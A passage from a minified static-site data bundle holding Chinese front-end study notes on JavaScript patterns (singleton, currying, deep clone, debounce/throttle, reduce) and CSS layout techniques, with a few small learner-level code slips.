    }\n    }\n    try {\n      executor(resolve,reject)\n    }catch(err)=>{\n      reject(err)\n    }\n  }\n}\n",charsets:{cjk:!0}},{title:"单例模式",frontmatter:{title:"单例模式"},regularPath:"/javascript/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F.html",relativePath:"javascript/单例模式.md",key:"v-5ea312a7",path:"/javascript/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F.html",headers:[{level:3,title:"单例模式",slug:"单例模式",normalizedTitle:"单例模式",charIndex:2}],headersStr:"单例模式",content:"# 单例模式\n\nvar Head = (function () {\n    var HeadClass = function () { }; // 声明HeadClass对象，无法在外部直接调用\n    var instance; // 声明一个instance对象\n    return function () {\n        if (instance) { // 如果已存在 则返回instance\n            return instance;\n        }\n        instance = new HeadClass() // 如果不存在 则new一个\n        return instance;\n    }\n})();\nvar a = Head();\nvar b = new Head();\nconsole.log(a===b) // true\nvar a = HeadClass(); // 报错,HeadClass is not defined\n\n",normalizedContent:"# 单例模式\n\nvar head = (function () {\n    var headclass = function () { }; // 声明headclass对象，无法在外部直接调用\n    var instance; // 声明一个instance对象\n    return function () {\n        if (instance) { // 如果已存在 则返回instance\n            return instance;\n        }\n        instance = new headclass() // 如果不存在 则new一个\n        return instance;\n    }\n})();\nvar a = head();\nvar b = new head();\nconsole.log(a===b) // true\nvar a = headclass(); // 报错,headclass is not defined\n\n",charsets:{cjk:!0}},{title:"函数柯里化",frontmatter:{title:"函数柯里化"},regularPath:"/javascript/%E6%9F%AF%E9%87%8C%E5%8C%96%E5%87%BD%E6%95%B0.html",relativePath:"javascript/柯里化函数.md",key:"v-63a30bf0",path:"/javascript/%E6%9F%AF%E9%87%8C%E5%8C%96%E5%87%BD%E6%95%B0.html",headers:[{level:3,title:"柯里化函数",slug:"柯里化函数",normalizedTitle:"柯里化函数",charIndex:2}],headersStr:"柯里化函数",content:"# 柯里化函数\n\n/**\n * @param fn:Function\n * @returns \n */\nfunction curry(fn:Function){\n  const fnLength = fn.length\n  let args:any =[]\n  function calc(this:any,...newArgs:any) {\n    // 积累参数\n    args = [...args,...newArgs]\n    // console.log('args :>> ', args);\n    if(args.length<fnLength){\n      // 参数不够，返回函数\n      return calc\n    }else {\n      // 参数够了，返回执行结果\n      return fn.apply(this,args.slice(0,fnLength))\n    }\n  }\n  return calc\n}\nfunction add(a: number, b: number, c: number): number {\n  return a + b + c\n}\nconst curryAdd = curry(add)\nconst res = curryAdd(1)(2)(3)\nconsole.info(res)\n",normalizedContent:"# 柯里化函数\n\n/**\n * @param fn:function\n * @returns \n */\nfunction curry(fn:function){\n  const fnlength = fn.length\n  let args:any =[]\n  function calc(this:any,...newargs:any) {\n    // 积累参数\n    args = [...args,...newargs]\n    // console.log('args :>> ', args);\n    if(args.length<fnlength){\n      // 参数不够，返回函数\n      return calc\n    }else {\n      // 参数够了，返回执行结果\n      return fn.apply(this,args.slice(0,fnlength))\n    }\n  }\n  return calc\n}\nfunction add(a: number, b: number, c: number): number {\n  return a + b + c\n}\nconst curryadd = curry(add)\nconst res = curryadd(1)(2)(3)\nconsole.info(res)\n",charsets:{cjk:!0}},{title:"flex布局",frontmatter:{title:"flex布局"},regularPath:"/webstudy/CSS/flex.html",relativePath:"webstudy/CSS/flex.md",key:"v-1f9cab6c",path:"/webstudy/CSS/flex.html",headers:[{level:3,title:"一些属性",slug:"一些属性",normalizedTitle:"一些属性",charIndex:13},{level:3,title:"骰子",slug:"骰子",normalizedTitle:"骰子",charIndex:525},{level:3,title:"自定义布局",slug:"自定义布局",normalizedTitle:"自定义布局",charIndex:1432},{level:3,title:"中间自适应",slug:"中间自适应",normalizedTitle:"中间自适应",charIndex:2300}],headersStr:"一些属性 骰子 自定义布局 中间自适应",content:'# flex布局\n\n\n# 一些属性\n\n# flex-grow、flex-shrink、flex-basis三个属性\n\n这三个属性都是在子元素上设置的\n\n * flex-basis用来设置元素的宽度，其实，width也可以设置宽度。如果元素上同时设置了width和flex-basis，那么width 的值就会被flex-basis覆盖掉\n * flex-grow该属性用来设置当父元素的宽度大于所有子元素的宽度的和时（即父元素会有剩余空间），子元素如何分配父元素的剩余空间。 flex-grow的默认值为0，意思是该元素不索取父元素的剩余空间，如果值大于0，表示索取。值越大，索取的越厉害\n * flex-shrink该属性用来设置，当父元素的宽度小于所有子元素的宽度的和时（即子元素会超出父元素），子元素如何缩小自己的宽度的。 flex-shrink的默认值为1，当父元素的宽度小于所有子元素的宽度的和时，子元素的宽度会减小。值越大，减小的越厉害。如果值为0，表示不减小\n\n# flex:1\n\n * flex: 1的值是 flex-grow: 1; flex-shrink: 1; flex-basis: 0%;元素占据剩余宽度的 1 份\n\n\n# 骰子\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <meta http-equiv="X-UA-Compatible" content="IE=edge">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>BFC</title>\n    <style>\n    .main {\n        width: 500px;\n        height: 500px;\n        background-color: #fff;\n        border: 1px solid #333;\n        /* box-sizing: border-box; */\n        display: flex;\n        justify-content: space-between;\n    }\n    .box {\n        width: 150px;\n        height: 150px;\n        border-radius: 50%;\n        background-color: lime;\n    }\n    .box2 {\n        align-self: center;\n    }\n    .box3 {\n        align-self: flex-end;\n    }\n    </style>\n</head>\n<body>\n    <div class="main">\n        <div class="box box1"></div>\n        <div class="box box2"></div>\n        <div class="box box3"></div>\n    </div>\n    <script>\n    <\/script>\n</body>\n</html>\n\n\n\n\n\n\n# 自定义布局\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8" />\n    <meta http-equiv="X-UA-Compatible" content="IE=edge" />\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n    <title>flex布局</title>\n    <style>\n      .main {\n        width: 300px;\n        height: 300px;\n        background-color: lime;\n        display: flex;\n        justify-content: space-around;\n        flex-wrap: wrap;\n        align-content: space-around;\n      }\n      .box {\n        width: 80px;\n        height: 80px;\n        background-color: orange;\n      }\n    </style>\n  </head>\n  <body>\n    <div class="main">\n      <div class="box"></div>\n      <div class="box"></div>\n      <div class="box"></div>\n      <div class="box"></div>\n      <div class="box"></div>\n      <div class="box"></div>\n    </div>\n    <script><\/script>\n  </body>\n</html>\n\n\n\n\n\n\n# 中间自适应\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8" />\n    <meta http-equiv="X-UA-Compatible" content="IE=edge" />\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n    <title>flex布局</title>\n    <style>\n      .main {\n        width: 100%;\n        height: 300px;\n        background-color: #fff;\n        display: flex;\n        justify-content: space-around;\n      }\n      div:not(.main) {\n        height: 300px;\n        width: 100px;\n      }\n      .first {\n        width: 200px;\n        background-color: red;\n      }\n      .second {\n        /* 属性用于设置或检索弹性盒子的扩展比率 */\n        flex-grow: 1; \n        background-color: limegreen;\n      }\n      .third {\n        width: 200px;\n        background-color: orange;\n      }\n    </style>\n  </head>\n  <body>\n    <div class="main">\n      <div class="first">1</div>\n      <div class="second">2</div>\n      <div class="third">3</div>\n    </div>\n    <script><\/script>\n  </body>\n</html>\n\n\n',normalizedContent:'# flex布局\n\n\n# 一些属性\n\n# flex-grow、flex-shrink、flex-basis三个属性\n\n这三个属性都是在子元素上设置的\n\n * flex-basis用来设置元素的宽度，其实，width也可以设置宽度。如果元素上同时设置了width和flex-basis，那么width 的值就会被flex-basis覆盖掉\n * flex-grow该属性用来设置当父元素的宽度大于所有子元素的宽度的和时（即父元素会有剩余空间），子元素如何分配父元素的剩余空间。 flex-grow的默认值为0，意思是该元素不索取父元素的剩余空间，如果值大于0，表示索取。值越大，索取的越厉害\n * flex-shrink该属性用来设置，当父元素的宽度小于所有子元素的宽度的和时（即子元素会超出父元素），子元素如何缩小自己的宽度的。 flex-shrink的默认值为1，当父元素的宽度小于所有子元素的宽度的和时，子元素的宽度会减小。值越大，减小的越厉害。如果值为0，表示不减小\n\n# flex:1\n\n * flex: 1的值是 flex-grow: 1; flex-shrink: 1; flex-basis: 0%;元素占据剩余宽度的 1 份\n\n\n# 骰子\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>bfc</title>\n    <style>\n    .main {\n        width: 500px;\n        height: 500px;\n        background-color: #fff;\n        border: 1px solid #333;\n        /* box-sizing: border-box; */\n        display: flex;\n        justify-content: space-between;\n    }\n    .box {\n        width: 150px;\n        height: 150px;\n        border-radius: 50%;\n        background-color: lime;\n    }\n    .box2 {\n        align-self: center;\n    }\n    .box3 {\n        align-self: flex-end;\n    }\n    </style>\n</head>\n<body>\n    <div class="main">\n        <div class="box box1"></div>\n        <div class="box box2"></div>\n        <div class="box box3"></div>\n    </div>\n    <script>\n    <\/script>\n</body>\n</html>\n\n\n\n\n\n\n# 自定义布局\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8" />\n    <meta http-equiv="x-ua-compatible" content="ie=edge" />\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n    <title>flex布局</title>\n    <style>\n      .main {\n        width: 300px;\n        height: 300px;\n        background-color: lime;\n        display: flex;\n        justify-content: space-around;\n        flex-wrap: wrap;\n        align-content: space-around;\n      }\n      .box {\n        width: 80px;\n        height: 80px;\n        background-color: orange;\n      }\n    </style>\n  </head>\n  <body>\n    <div class="main">\n      <div class="box"></div>\n      <div class="box"></div>\n      <div class="box"></div>\n      <div class="box"></div>\n      <div class="box"></div>\n      <div class="box"></div>\n    </div>\n    <script><\/script>\n  </body>\n</html>\n\n\n\n\n\n\n# 中间自适应\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8" />\n    <meta http-equiv="x-ua-compatible" content="ie=edge" />\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n    <title>flex布局</title>\n    <style>\n      .main {\n        width: 100%;\n        height: 300px;\n        background-color: #fff;\n        display: flex;\n        justify-content: space-around;\n      }\n      div:not(.main) {\n        height: 300px;\n        width: 100px;\n      }\n      .first {\n        width: 200px;\n        background-color: red;\n      }\n      .second {\n        /* 属性用于设置或检索弹性盒子的扩展比率 */\n        flex-grow: 1; \n        background-color: limegreen;\n      }\n      .third {\n        width: 200px;\n        background-color: orange;\n      }\n    </style>\n  </head>\n  <body>\n    <div class="main">\n      <div class="first">1</div>\n      <div class="second">2</div>\n      <div class="third">3</div>\n    </div>\n    <script><\/script>\n  </body>\n</html>\n\n\n',charsets:{cjk:!0}},{title:"深拷贝",frontmatter:{title:"深拷贝"},regularPath:"/javascript/%E6%B7%B1%E6%8B%B7%E8%B4%9D.html",relativePath:"javascript/深拷贝.md",key:"v-8737a776",path:"/javascript/%E6%B7%B1%E6%8B%B7%E8%B4%9D.html",headers:[{level:2,title:"递归实现",slug:"递归实现",normalizedTitle:"递归实现",charIndex:2}],headersStr:"递归实现",content:'# 递归实现\n\n注意typeof instanceof hasOwnProperty的使用\n\nfunction deepClone(obj = {}) {\n    if (typeof obj !== "object" || obj == null) {\n      return obj;\n    }\n    let result;\n    if (obj instanceof Array) {\n      result = [];\n    } else {\n      result = {};\n    }\n    for (let key in obj) {\n      if (obj.hasOwnProperty(key)) {\n        //obj.hasOwnProperty(key)? 保证key不是原型的属性\n        //接下来递归\n        result[key] = deepClone(obj[key]);\n      }\n    }\n    return result\n  }\n',normalizedContent:'# 递归实现\n\n注意typeof instanceof hasownproperty的使用\n\nfunction deepclone(obj = {}) {\n    if (typeof obj !== "object" || obj == null) {\n      return obj;\n    }\n    let result;\n    if (obj instanceof array) {\n      result = [];\n    } else {\n      result = {};\n    }\n    for (let key in obj) {\n      if (obj.hasownproperty(key)) {\n        //obj.hasownproperty(key)? 保证key不是原型的属性\n        //接下来递归\n        result[key] = deepclone(obj[key]);\n      }\n    }\n    return result\n  }\n',charsets:{cjk:!0}},{title:"节流和防抖",frontmatter:{title:"节流和防抖"},regularPath:"/javascript/%E8%8A%82%E6%B5%81%E5%92%8C%E9%98%B2%E6%8A%96.html",relativePath:"javascript/节流和防抖.md",key:"v-87ba4012",path:"/javascript/%E8%8A%82%E6%B5%81%E5%92%8C%E9%98%B2%E6%8A%96.html",headers:[{level:2,title:"debounce",slug:"debounce",normalizedTitle:"debounce",charIndex:2},{level:2,title:"throttle",slug:"throttle",normalizedTitle:"throttle",charIndex:341}],headersStr:"debounce throttle",content:"# debounce\n\nfunction debounce(func, delay=500) {\n  let timer = null\n  return function(){\n    if(timer){\n      clearTimeout(timer)\n    }\n    timer = setTimeout(()=>{\n      func.apply(this,arguments)\n    },delay)\n  }\n}\nfunction handle() {\n    console.log('防抖：', Math.random());\n}  \nwindow.addEventListener('scroll', debounce(handle,500))\n\n\n\n# throttle\n\nfunction throttle(func, delay=500) {\n  let prevTime = 0\n  return function() {\n    if (Date.now() - prevTime > delay) {\n      func.apply(this, arguments)\n      prevTimer = Date.now()\n    }\n  }\n}\nfunction testFn (){\n    console.log(new Date().getTime());\n}\nwindow.onscroll = throttle(testFn, 200);\n",normalizedContent:"# debounce\n\nfunction debounce(func, delay=500) {\n  let timer = null\n  return function(){\n    if(timer){\n      cleartimeout(timer)\n    }\n    timer = settimeout(()=>{\n      func.apply(this,arguments)\n    },delay)\n  }\n}\nfunction handle() {\n    console.log('防抖：', math.random());\n}  \nwindow.addeventlistener('scroll', debounce(handle,500))\n\n\n\n# throttle\n\nfunction throttle(func, delay=500) {\n  let prevtime = 0\n  return function() {\n    if (date.now() - prevtime > delay) {\n      func.apply(this, arguments)\n      prevtimer = date.now()\n    }\n  }\n}\nfunction testfn (){\n    console.log(new date().gettime());\n}\nwindow.onscroll = throttle(testfn, 200);\n",charsets:{cjk:!0}},{title:"文字超出省略",frontmatter:{title:"文字超出省略"},regularPath:"/webstudy/CSS/%E6%96%87%E5%AD%97%E8%B6%85%E5%87%BA%E7%9C%81%E7%95%A5.html",relativePath:"webstudy/CSS/文字超出省略.md",key:"v-3359d280",path:"/webstudy/CSS/%E6%96%87%E5%AD%97%E8%B6%85%E5%87%BA%E7%9C%81%E7%95%A5.html",headers:[{level:2,title:"单行文字",slug:"单行文字",normalizedTitle:"单行文字",charIndex:13},{level:2,title:"多行文字",slug:"多行文字",normalizedTitle:"多行文字",charIndex:177}],headersStr:"单行文字 多行文字",content:"# 文字超出省略\n\n\n# 单行文字\n\n#box1 {\n    border: 1px solid #ccc;\n    width: 100px;\n    white-space: nowrap; /* 不换行 */\n    overflow: hidden;\n    text-overflow: ellipsis; /* 超出省略 */\n}\n\n\n\n# 多行文字\n\n#box2 {\n    border: 1px solid #ccc;\n    width: 100px;\n    overflow: hidden;\n    display: -webkit-box; /* 将对象作为弹性伸缩盒子模型显示 */\n    -webkit-box-orient: vertical; /* 设置子元素排列方式 */\n    -webkit-line-clamp: 3; /* 显示几行，超出的省略 */\n}\n",normalizedContent:"# 文字超出省略\n\n\n# 单行文字\n\n#box1 {\n    border: 1px solid #ccc;\n    width: 100px;\n    white-space: nowrap; /* 不换行 */\n    overflow: hidden;\n    text-overflow: ellipsis; /* 超出省略 */\n}\n\n\n\n# 多行文字\n\n#box2 {\n    border: 1px solid #ccc;\n    width: 100px;\n    overflow: hidden;\n    display: -webkit-box; /* 将对象作为弹性伸缩盒子模型显示 */\n    -webkit-box-orient: vertical; /* 设置子元素排列方式 */\n    -webkit-line-clamp: 3; /* 显示几行，超出的省略 */\n}\n",charsets:{cjk:!0}},{title:"零碎的知识",frontmatter:{title:"零碎的知识"},regularPath:"/webstudy/CSS/%E9%9B%B6%E7%A2%8E%E7%9A%84%E7%9F%A5%E8%AF%86.html",relativePath:"webstudy/CSS/零碎的知识.md",key:"v-3761fc08",path:"/webstudy/CSS/%E9%9B%B6%E7%A2%8E%E7%9A%84%E7%9F%A5%E8%AF%86.html",headers:[{level:2,title:"css 盒模型",slug:"css-盒模型",normalizedTitle:"css 盒模型",charIndex:12},{level:2,title:"px，em，rem，vh/vw",slug:"px-em-rem-vh-vw",normalizedTitle:"px，em，rem，vh/vw",charIndex:206},{level:2,title:"伪类选择器",slug:"伪类选择器",normalizedTitle:"伪类选择器",charIndex:389},{level:2,title:"BFC",slug:"bfc",normalizedTitle:"bfc",charIndex:540},{level:2,title:"div 水平垂直居中（至少三种）",slug:"div-水平垂直居中-至少三种",normalizedTitle:"div 水平垂直居中（至少三种）",charIndex:1350},{level:2,title:"清除浮动",slug:"清除浮动",normalizedTitle:"清除浮动",charIndex:1926},{level:2,title:"0.5px 的线",slug:"_0-5px-的线",normalizedTitle:"0.5px 的线",charIndex:2009},{level:2,title:"link 与 @import 区别",slug:"link-与-import-区别",normalizedTitle:"link 与 @import 区别",charIndex:2251},{level:3,title:"区别",slug:"区别",normalizedTitle:"区别",charIndex:2266},{level:3,title:"兼容性",slug:"兼容性",normalizedTitle:"兼容性",charIndex:2368},{level:3,title:"性能方面",slug:"性能方面",normalizedTitle:"性能方面",charIndex:2434},{level:2,title:"requestAnimationFrame",slug:"requestanimationframe",normalizedTitle:"requestanimationframe",charIndex:2490}],headersStr:"css 盒模型 px，em，rem，vh/vw 伪类选择器 BFC div 水平垂直居中（至少三种） 清除浮动 0.5px 的线 link 与 @import 区别 区别 兼容性 性能方面 requestAnimationFrame",content:'# 零碎的知识\n\n\n# css 盒模型\n\nCSS 盒模型分为两种，一种是标准盒模型，一种是 IE 盒模型\n\n# 标准盒模型\n\n结构是 content+padding+border+margin，元素的宽高只是 content 部分\n\n# IE 盒模型\n\n结构同上 但是宽高却把 padding 和 border 也算在内了\n\n# 如何切换为 IE 盒模型\n\nbox-sizing: border-box\n\n\n# px，em，rem，vh/vw\n\n * px 像素单位\n * em 相对于当前元素的 font-size。首行缩进可以使用 text-indent: 2em。\n * rem = root em，相对于根元素的 font-size 。可以根据媒体查询，设置根元素的 font-size ，实现移动端适配。\n * vw 屏幕宽度的 1%,vh 屏幕高度的 1%\n\n\n# 伪类选择器\n\n * :hover\n * :first-child 例如: p:first-child i 第一个子元素的 p 元素中的所有 i 元素\n * :last-child\n * :not(selector)\n * :nth-child(n)\n * :nth-last-child(n)\n\n\n# BFC\n\n块格式化上下文\n\n例如：\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <meta http-equiv="X-UA-Compatible" content="IE=edge">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>BFC</title>\n    <style>\n      .green {\n            width: 200px;\n            height: 100px;\n            margin-bottom: 20px;\n            background-color: green;\n        }\n        .red {\n            width: 200px;\n            height: 100px;\n            margin-top: 30px;\n            background-color: red;\n        }\n        .box {\n            /* overflow: hidden; */\n            display: flow-root; /**元素块状化，同时包含格式化上下文BFC*/\n        } \n  </style>\n</head>\n<body>\n    <div class="green"></div>\n    <div class="box">\n        <div class="red">BFC</div>\n    </div>\n</body>\n</html>\n\n\n\n\n# div 水平垂直居中（至少三种）\n\n/**第一种*/\n.div1 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #99f;\n  position: absolute;\n  left: 50%;\n  top: 50%;\n  transform: translate(-50%, -50%);\n}\n/**第二种*/\n.div2 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #99f;\n  position: absolute;\n  left: 0;\n  top: 0;\n  bottom: 0;\n  right: 0;\n  margin: auto;\n}\n/**第三种*/\n.div3 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #9f9;\n  position: absolute;\n  left: 50%;\n  top: 50%;\n  margin-left: -200px;\n  margin-top: -200px;\n}\n\n\n\n# 清除浮动\n\n.clearfix:after {\n    content:\'\',\n    display:table,\n    clear:both\n  }\n\n\n\n# 0.5px 的线\n\n#box {\n    padding: 10px 0;\n    position: relative;\n}\n#box::before {\n    content: \'\';\n    position: absolute;\n    left: 0;\n    bottom: 0;\n    width: 100%;\n    height: 1px;\n    background: #d9d9d9;\n    transform: scaleY(0.5);\n}\n\n\n\n# link 与 @import 区别\n\n\n# 区别\n\n * link 是 HTML 的标签，可以在 html 页面中使用 link 标签来加载 CSS 资源\n * @import 是 CSS 的标准，只能在 css 文件中使用\n\n\n# 兼容性\n\n * link 不会有兼容性问题，因为是一个标准的标签 而@import 可能在某些低版本浏览器中会有兼容性问题\n\n\n# 性能方面\n\n * @import 由于是在 css 中引入了额外的 css，有时候页面会出现闪烁的问题\n\n\n# requestAnimationFrame\n\n首先要知道它是干啥的？ 它是用来定义动画，我们知道定义动画有大概这么几种：\n\n * 一种是 transition，即过渡。\n * 第二种是 animation，即动画\n * 第三种，就是利用 js 的 setTimeout，setInterval 这种写动画 requestAnimationFrame 的出现提供了第四种可能，而且在各方面完胜第三种，可以说是第三种的替代品。 其优点在以下几个方面： CPU 性能：使用 requestAnimationFrame 定义的动画，在浏览器最小化，元素消失的时候，就不会再继续下去了，可以提高性能。 函数节流：在动画间隔时间内，只会执行一次。 减少 DOM 操作：每一帧的动画会将所有的 DOM 操作集合起来，在重绘或者回流中一次性搞定 使用: id = window.requestAnimationFrame(cb); 取消动画: window.cancelAnimationFrame(id)',normalizedContent:'# 零碎的知识\n\n\n# css 盒模型\n\ncss 盒模型分为两种，一种是标准盒模型，一种是 ie 盒模型\n\n# 标准盒模型\n\n结构是 content+padding+border+margin，元素的宽高只是 content 部分\n\n# ie 盒模型\n\n结构同上 但是宽高却把 padding 和 border 也算在内了\n\n# 如何切换为 ie 盒模型\n\nbox-sizing: border-box\n\n\n# px，em，rem，vh/vw\n\n * px 像素单位\n * em 相对于当前元素的 font-size。首行缩进可以使用 text-indent: 2em。\n * rem = root em，相对于根元素的 font-size 。可以根据媒体查询，设置根元素的 font-size ，实现移动端适配。\n * vw 屏幕宽度的 1%,vh 屏幕高度的 1%\n\n\n# 伪类选择器\n\n * :hover\n * :first-child 例如: p:first-child i 第一个子元素的 p 元素中的所有 i 元素\n * :last-child\n * :not(selector)\n * :nth-child(n)\n * :nth-last-child(n)\n\n\n# bfc\n\n块格式化上下文\n\n例如：\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>bfc</title>\n    <style>\n      .green {\n            width: 200px;\n            height: 100px;\n            margin-bottom: 20px;\n            background-color: green;\n        }\n        .red {\n            width: 200px;\n            height: 100px;\n            margin-top: 30px;\n            background-color: red;\n        }\n        .box {\n            /* overflow: hidden; */\n            display: flow-root; /**元素块状化，同时包含格式化上下文bfc*/\n        } \n  </style>\n</head>\n<body>\n    <div class="green"></div>\n    <div class="box">\n        <div class="red">bfc</div>\n    </div>\n</body>\n</html>\n\n\n\n\n# div 水平垂直居中（至少三种）\n\n/**第一种*/\n.div1 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #99f;\n  position: absolute;\n  left: 50%;\n  top: 50%;\n  transform: translate(-50%, -50%);\n}\n/**第二种*/\n.div2 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #99f;\n  position: absolute;\n  left: 0;\n  top: 0;\n  bottom: 0;\n  right: 0;\n  margin: auto;\n}\n/**第三种*/\n.div3 {\n  width: 400px;\n  height: 400px;\n  border: #ccc 1px solid;\n  background: #9f9;\n  position: absolute;\n  left: 50%;\n  top: 50%;\n  margin-left: -200px;\n  margin-top: -200px;\n}\n\n\n\n# 清除浮动\n\n.clearfix:after {\n    content:\'\',\n    display:table,\n    clear:both\n  }\n\n\n\n# 0.5px 的线\n\n#box {\n    padding: 10px 0;\n    position: relative;\n}\n#box::before {\n    content: \'\';\n    position: absolute;\n    left: 0;\n    bottom: 0;\n    width: 100%;\n    height: 1px;\n    background: #d9d9d9;\n    transform: scaley(0.5);\n}\n\n\n\n# link 与 @import 区别\n\n\n# 区别\n\n * link 是 html 的标签，可以在 html 页面中使用 link 标签来加载 css 资源\n * @import 是 css 的标准，只能在 css 文件中使用\n\n\n# 兼容性\n\n * link 不会有兼容性问题，因为是一个标准的标签 而@import 可能在某些低版本浏览器中会有兼容性问题\n\n\n# 性能方面\n\n * @import 由于是在 css 中引入了额外的 css，有时候页面会出现闪烁的问题\n\n\n# requestanimationframe\n\n首先要知道它是干啥的？ 它是用来定义动画，我们知道定义动画有大概这么几种：\n\n * 一种是 transition，即过渡。\n * 第二种是 animation，即动画\n * 第三种，就是利用 js 的 settimeout，setinterval 这种写动画 requestanimationframe 的出现提供了第四种可能，而且在各方面完胜第三种，可以说是第三种的替代品。 其优点在以下几个方面： cpu 性能：使用 requestanimationframe 定义的动画，在浏览器最小化，元素消失的时候，就不会再继续下去了，可以提高性能。 函数节流：在动画间隔时间内，只会执行一次。 减少 dom 操作：每一帧的动画会将所有的 dom 操作集合起来，在重绘或者回流中一次性搞定 使用: id = window.requestanimationframe(cb); 取消动画: window.cancelanimationframe(id)',charsets:{cjk:!0}},{title:"for await of",frontmatter:{title:"for await of"},regularPath:"/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/for%20await%20of.html",relativePath:"webstudy/ES6及以上/for await of.md",key:"v-c68b6434",path:"/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/for%20await%20of.html",headers:[{level:2,title:"for await of(异步迭代器)",slug:"for-await-of-异步迭代器",normalizedTitle:"for await of(异步迭代器)",charIndex:2},{level:3,title:"for await of",slug:"for-await-of",normalizedTitle:"for await of",charIndex:2}],headersStr:"for await of(异步迭代器) for await of",content:"# for await of(异步迭代器)\n\n\n# for await of\n\n循环等待每个Promise对象变为resolved状态才进入下一步\n\nfunction getData(data){\n    return new Promise(resovle=>{\n      setTimeout(()=>{\n        resovle(data)\n      },1500)\n    })\n  }\n  //使用Promise.all\n  (async function(){\n    const apiList = [getData(100),getData(200),getData(300)]\n    Promise.all(apiList).then(res=>{\n      console.log('res :>> ', res); //[100,200,300]\n    })\n  })()\n  //使用for await of\n  (async function(){\n    const apiList = [getData(100),getData(200),getData(300)]\n    for await(let res of apiList){\n      console.log('res :>> ', res);\n    }\n  })()\n\n\n> for await of等同于Promise.all,写法更加优雅",normalizedContent:"# for await of(异步迭代器)\n\n\n# for await of\n\n循环等待每个promise对象变为resolved状态才进入下一步\n\nfunction getdata(data){\n    return new promise(resovle=>{\n      settimeout(()=>{\n        resovle(data)\n      },1500)\n    })\n  }\n  //使用promise.all\n  (async function(){\n    const apilist = [getdata(100),getdata(200),getdata(300)]\n    promise.all(apilist).then(res=>{\n      console.log('res :>> ', res); //[100,200,300]\n    })\n  })()\n  //使用for await of\n  (async function(){\n    const apilist = [getdata(100),getdata(200),getdata(300)]\n    for await(let res of apilist){\n      console.log('res :>> ', res);\n    }\n  })()\n\n\n> for await of等同于promise.all,写法更加优雅",charsets:{cjk:!0}},{title:"reduce",frontmatter:{title:"reduce"},regularPath:"/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/reduce.html",relativePath:"webstudy/ES6及以上/reduce.md",key:"v-6669fe90",path:"/webstudy/ES6%E5%8F%8A%E4%BB%A5%E4%B8%8A/reduce.html",headers:[{level:2,title:"reduce",slug:"reduce",normalizedTitle:"reduce",charIndex:2},{level:3,title:"基本",slug:"基本",normalizedTitle:"基本",charIndex:13},{level:3,title:"使用",slug:"使用",normalizedTitle:"使用",charIndex:133}],headersStr:"reduce 基本 使用",content:'# reduce\n\n\n# 基本\n\n> arr.reduce(callback, [initialValue])\n\ncallback包括四个参数\n\n * accumulator\n * currentValue\n * currentIndex\n * array\n\n\n# 使用\n\n# 求和\n\nlet arr = [1,2,3,4]\narr.reduce((accumulator, currentValue, currentIndex)=>{\n  return accumulator+currentValue\n},0)\n\n\n# 求最大值最小值\n\nlet arr = [200,2,3,4,100];\n let arrresult = arr.reduce((accumulator, currentValue, currentIndex) => {\n    return Math.max(accumulator, currentValue)\n })\n console.log(arrresult) //200\n let arrresult1 = arr.reduce((accumulator, currentValue, currentIndex) => {\n          return Math.min(accumulator, currentValue)\n })\n console.log(arrresult1) //2\n //过于麻烦\n //不如\n Math.max(...[1,2,3,4])\n\n\n# 去重unique\n\n let array = [\n  { id: 1, name: "a" },\n  { id: 2, name: "b" },\n  { id: 3, name: "c" },\n  { id: 5, name: "d" },\n  { id: 1, name: "e" },\n];\nfunction unique(arr,key){\n  let obj = {}\n  return arr.reduce((accumulator,currentValue,currentIndex)=>{\n   //当前key键的value值存在于obj函数中时,说明重复\n    if(!obj[currentValue[key]]){\n      obj[currentValue[key]]=true\n      accumulator.push(currentValue)\n    }\n    return accumulator\n  },[])\n}\nconsole.log(\'unique(array,id) :>> \', unique(array,\'id\'));\n\n\n# 扁平化flatten\n\nfunction flatten(arr){\n  return arr.reduce((accumulator,currentValue,currentIndex)=>{\n    return accumulator.concat(Array.isArray(currentValue)?flatten(currentValue):currentValue)\n  },[])\n}\nconsole.log(flatten([1,[2,3],[4,5,[6,7]]]))\n',normalizedContent:'# reduce\n\n\n# 基本\n\n> arr.reduce(callback, [initialvalue])\n\ncallback包括四个参数\n\n * accumulator\n * currentvalue\n * currentindex\n * array\n\n\n# 使用\n\n# 求和\n\nlet arr = [1,2,3,4]\narr.reduce((accumulator, currentvalue, currentindex)=>{\n  return accumulator+currentvalue\n},0)\n\n\n# 求最大值最小值\n\nlet arr = [200,2,3,4,100];\n let arrresult = arr.reduce((accumulator, currentvalue, currentindex) => {\n    return math.max(accumulator, currentvalue)\n })\n console.log(arrresult) //200\n let arrresult1 = arr.reduce((accumulator, currentvalue, currentindex) => {\n          return math.min(accumulator, currentvalue)\n })\n console.log(arrresult1) //2\n //过于麻烦\n //不如\n 